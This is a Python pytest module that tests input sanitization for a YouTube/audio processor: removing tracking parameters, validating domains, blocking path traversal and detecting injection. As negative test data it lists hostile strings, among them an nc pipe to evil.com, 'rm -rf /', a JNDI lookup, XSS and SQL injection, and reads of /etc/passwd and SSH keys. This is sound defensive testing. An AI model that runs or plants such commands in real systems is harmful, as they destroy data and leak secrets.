"""
Test Input Sanitization for Stage 1 Input Validation

This module tests the input sanitization functionality including:
- URL sanitization and parameter cleaning
- Path security and traversal prevention
- Malicious input detection
- Input normalization and standardization
"""

import pytest
import os
from pathlib import Path
from unittest.mock import patch

# Import the functions we're testing
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "Code"))

from master_processor import MasterProcessor


class TestUrlSanitization:
    """Test URL sanitization and cleaning."""
    
    def test_tracking_parameter_removal(self):
        """Test removal of tracking parameters from URLs."""
        processor = MasterProcessor()
        
        dirty_urls = [
            "https://youtube.com/watch?v=dQw4w9WgXcQ&utm_source=facebook",
            "https://youtube.com/watch?v=dQw4w9WgXcQ&fbclid=IwAR123",
            "https://youtube.com/watch?v=dQw4w9WgXcQ&utm_campaign=test&utm_medium=social",
            "https://youtube.com/watch?v=dQw4w9WgXcQ&gclid=123&dclid=456",
        ]
        
        for dirty_url in dirty_urls:
            clean_url = processor._sanitize_youtube_url(dirty_url)
            
            # Should preserve video ID
            assert "dQw4w9WgXcQ" in clean_url
            
            # Should remove tracking parameters
            tracking_params = ['utm_source', 'utm_campaign', 'utm_medium', 'fbclid', 'gclid', 'dclid']
            for param in tracking_params:
                assert param not in clean_url, f"Should remove {param} from URL"
    
    def test_safe_parameter_preservation(self):
        """Test that safe parameters are preserved during sanitization."""
        processor = MasterProcessor()
        
        url_with_safe_params = "https://youtube.com/watch?v=dQw4w9WgXcQ&t=30s&feature=share"
        clean_url = processor._sanitize_youtube_url(url_with_safe_params)
        
        # Should preserve video ID and safe parameters
        assert "dQw4w9WgXcQ" in clean_url
        assert "t=30s" in clean_url  # Timestamp is safe
        # feature=share might be removed or kept depending on policy
    
    def test_malicious_url_detection(self):
        """Test detection of malicious URLs."""
        processor = MasterProcessor()
        
        malicious_urls = [
            "https://youtube.evil.com/watch?v=dQw4w9WgXcQ",
            "https://www.youtube.com.phishing.com/watch?v=dQw4w9WgXcQ",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "https://youtube.com/watch?v=<script>alert('xss')</script>",
            "https://youtube.com/watch?v=../../../etc/passwd",
        ]
        
        for malicious_url in malicious_urls:
            is_safe = processor._is_safe_youtube_url(malicious_url)
            assert is_safe is False, f"Should detect malicious URL: {malicious_url}"
    
    def test_domain_validation(self):
        """Test validation of YouTube domain variants."""
        processor = MasterProcessor()
        
        valid_domains = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://youtube.com/watch?v=dQw4w9WgXcQ",
            "https://m.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://youtu.be/dQw4w9WgXcQ",
        ]
        
        invalid_domains = [
            "https://youtube.evil.com/watch?v=dQw4w9WgXcQ",
            "https://fakeyoutube.com/watch?v=dQw4w9WgXcQ",
            "https://youtube-fake.com/watch?v=dQw4w9WgXcQ",
        ]
        
        for valid_url in valid_domains:
            assert processor._is_valid_youtube_domain(valid_url) is True, f"Should accept valid domain: {valid_url}"
        
        for invalid_url in invalid_domains:
            assert processor._is_valid_youtube_domain(invalid_url) is False, f"Should reject invalid domain: {invalid_url}"
    
    def test_url_encoding_handling(self):
        """Test handling of URL-encoded characters."""
        processor = MasterProcessor()
        
        encoded_urls = [
            "https://youtube.com/watch?v=dQw4w9WgXcQ&t=30%73",  # %73 = 's'
            "https://youtube.com/watch?v=dQw4w9WgXcQ%26t%3D30s",  # %26 = '&', %3D = '='
        ]
        
        for encoded_url in encoded_urls:
            clean_url = processor._sanitize_youtube_url(encoded_url)
            assert "dQw4w9WgXcQ" in clean_url
            # Should handle encoding properly without breaking the URL


class TestPathSecurity:
    """Test path security and traversal prevention."""
    
    def test_path_traversal_prevention(self, malicious_paths):
        """Test prevention of path traversal attacks."""
        processor = MasterProcessor()
        
        for malicious_path in malicious_paths:
            is_safe = processor._is_safe_file_path(malicious_path)
            assert is_safe is False, f"Should reject path traversal attempt: {malicious_path}"
    
    def test_absolute_path_validation(self):
        """Test validation of absolute paths."""
        processor = MasterProcessor()
        
        if os.name == 'nt':  # Windows
            valid_paths = [
                "C:\\Users\\test\\audio.mp3",
                "D:\\Music\\song.wav",
                "C:\\Program Files\\App\\audio.flac",
            ]
            invalid_paths = [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ]
        else:  # Unix-like
            valid_paths = [
                "/home/user/audio.mp3",
                "/tmp/test.wav",
                "/usr/local/share/audio.flac",
            ]
            invalid_paths = [
                "/etc/passwd",
                "/etc/shadow",
                "/root/.ssh/id_rsa",
            ]
        
        for valid_path in valid_paths:
            # Should not reject valid paths (even if file doesn't exist)
            is_safe = processor._is_safe_file_path(valid_path)
            assert is_safe is True, f"Should accept safe path: {valid_path}"
        
        for invalid_path in invalid_paths:
            # Should reject access to sensitive system files
            is_safe = processor._is_safe_file_path(invalid_path)
            assert is_safe is False, f"Should reject sensitive path: {invalid_path}"
    
    def test_network_path_detection(self):
        """Test detection and handling of network paths."""
        processor = MasterProcessor()
        
        network_paths = [
            "\\\\server\\share\\file.mp3",
            "//server/share/file.mp3",
            "ftp://server/file.mp3",
            "http://server/file.mp3",
            "https://server/file.mp3",
            "smb://server/share/file.mp3",
        ]
        
        for network_path in network_paths:
            is_network = processor._is_network_path(network_path)
            assert is_network is True, f"Should detect network path: {network_path}"
    
    def test_special_character_handling(self):
        """Test handling of special characters in paths."""
        processor = MasterProcessor()
        
        paths_with_special_chars = [
            "test file with spaces.mp3",
            "test-file_with-symbols.mp3",
            "test[file]with(brackets).mp3",
            "test'file'with'quotes.mp3",
            'test"file"with"double"quotes.mp3',
        ]
        
        for path in paths_with_special_chars:
            sanitized = processor._sanitize_file_path(path)
            
            # Should handle special characters safely
            assert len(sanitized) > 0, f"Should not empty path with special chars: {path}"
            # Should not contain dangerous sequences
            assert ".." not in sanitized, f"Should not contain .. in sanitized path: {sanitized}"


class TestInputNormalization:
    """Test input normalization and standardization."""
    
    def test_whitespace_trimming(self):
        """Test trimming of whitespace from inputs."""
        processor = MasterProcessor()
        
        inputs_with_whitespace = [
            "  https://youtube.com/watch?v=dQw4w9WgXcQ  ",
            "\t\nhttps://youtube.com/watch?v=dQw4w9WgXcQ\n\t",
            "   /path/to/audio.mp3   ",
        ]
        
        for input_with_ws in inputs_with_whitespace:
            normalized = processor._normalize_input(input_with_ws)
            
            assert not normalized.startswith(' '), f"Should trim leading whitespace: '{input_with_ws}'"
            assert not normalized.endswith(' '), f"Should trim trailing whitespace: '{input_with_ws}'"
            assert '\t' not in normalized, f"Should remove tabs: '{input_with_ws}'"
            assert '\n' not in normalized, f"Should remove newlines: '{input_with_ws}'"
    
    def test_case_normalization(self):
        """Test case normalization for file extensions."""
        processor = MasterProcessor()
        
        paths_with_mixed_case = [
            "test.MP3",
            "test.Wav",
            "test.FLAC",
            "test.M4A",
        ]
        
        for path in paths_with_mixed_case:
            normalized = processor._normalize_file_path(path)
            
            # Extension should be normalized to lowercase
            extension = os.path.splitext(normalized)[1]
            assert extension.islower(), f"Extension should be lowercase: {extension}"
    
    def test_path_separator_normalization(self):
        """Test normalization of path separators."""
        processor = MasterProcessor()
        
        mixed_separator_paths = [
            "folder\\subfolder/file.mp3",
            "folder/subfolder\\file.mp3",
            "folder\\\\subfolder\\file.mp3",
            "folder//subfolder/file.mp3",
        ]
        
        for path in mixed_separator_paths:
            normalized = processor._normalize_file_path(path)
            
            # Should use consistent path separators
            if os.name == 'nt':  # Windows
                assert '/' not in normalized or normalized.count('/') <= normalized.count('\\')
            else:  # Unix-like
                assert '\\' not in normalized


class TestSecurityValidation:
    """Test security validation of inputs."""
    
    def test_script_injection_prevention(self):
        """Test prevention of script injection attempts."""
        processor = MasterProcessor()
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",  # Template injection
            "<%=7*7%>",  # ASP injection
        ]
        
        for malicious_input in malicious_inputs:
            is_safe = processor._is_safe_input(malicious_input)
            assert is_safe is False, f"Should detect malicious input: {malicious_input}"
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attempts."""
        processor = MasterProcessor()
        
        command_injection_attempts = [
            "file.mp3; rm -rf /",
            "file.mp3 && echo 'pwned'",
            "file.mp3 | nc evil.com 1337",
            "file.mp3 `whoami`",
            "file.mp3 $(cat /etc/passwd)",
        ]
        
        for injection_attempt in command_injection_attempts:
            is_safe = processor._is_safe_input(injection_attempt)
            assert is_safe is False, f"Should detect command injection: {injection_attempt}"
    
    def test_file_inclusion_prevention(self):
        """Test prevention of file inclusion attacks."""
        processor = MasterProcessor()
        
        file_inclusion_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/proc/self/environ",
            "/dev/random",
            "php://filter/read=convert.base64-encode/resource=index.php",
        ]
        
        for inclusion_attempt in file_inclusion_attempts:
            is_safe = processor._is_safe_file_path(inclusion_attempt)
            assert is_safe is False, f"Should prevent file inclusion: {inclusion_attempt}"


class TestInputLengthValidation:
    """Test validation of input lengths."""
    
    def test_maximum_url_length(self):
        """Test handling of extremely long URLs."""
        processor = MasterProcessor()
        
        # Create extremely long URL
        base_url = "https://youtube.com/watch?v=dQw4w9WgXcQ"
        long_params = "&" + "&".join([f"param{i}={'x' * 100}" for i in range(100)])
        very_long_url = base_url + long_params
        
        # Should handle long URLs gracefully
        result = processor._validate_youtube_url(very_long_url)
        # Either reject due to length or accept and sanitize
        assert isinstance(result, bool), "Should return boolean for very long URL"
    
    def test_maximum_path_length(self):
        """Test handling of extremely long file paths."""
        processor = MasterProcessor()
        
        # Create extremely long path
        very_long_path = "/" + "/".join(["folder" * 50 for _ in range(20)]) + "/file.mp3"
        
        # Should handle long paths gracefully
        is_safe = processor._is_safe_file_path(very_long_path)
        assert isinstance(is_safe, bool), "Should return boolean for very long path"
    
    def test_empty_input_handling(self):
        """Test handling of empty inputs."""
        processor = MasterProcessor()
        
        empty_inputs = ["", None, " ", "\t", "\n"]
        
        for empty_input in empty_inputs:
            normalized = processor._normalize_input(empty_input) if empty_input is not None else None
            
            if normalized is not None:
                assert len(normalized.strip()) == 0, f"Empty input should normalize to empty: '{empty_input}'"


@pytest.mark.integration  
class TestSanitizationIntegration:
    """Integration tests for sanitization with Stage 1 processing."""
    
    def test_stage_1_url_sanitization(self):
        """Test that Stage 1 properly sanitizes URLs before processing."""
        processor = MasterProcessor()
        
        dirty_url = "https://youtube.com/watch?v=dQw4w9WgXcQ&utm_source=test&fbclid=123"
        result = processor._stage_1_input_validation(dirty_url, None)
        
        # Should process successfully after sanitization
        if result['valid']:
            # Clean URL should be in the result
            assert 'utm_source' not in result.get('validated_input', '')
            assert 'fbclid' not in result.get('validated_input', '')
            assert 'dQw4w9WgXcQ' in result.get('validated_input', '')
    
    def test_stage_1_path_sanitization(self, tmp_path):
        """Test that Stage 1 properly sanitizes file paths before processing."""
        processor = MasterProcessor()
        
        # Create a test file with spaces
        test_file = tmp_path / "file with spaces.mp3"
        test_file.write_bytes(b'fake audio data')
        
        # Test with unnormalized path
        unnormalized_path = str(test_file).replace(os.sep, '/' if os.name == 'nt' else '\\')
        result = processor._stage_1_input_validation(None, unnormalized_path)
        
        # Should process successfully after sanitization
        if result['valid']:
            # Sanitized path should be absolute and normalized
            sanitized_path = result.get('validated_input', '')
            assert os.path.isabs(sanitized_path), "Should convert to absolute path"
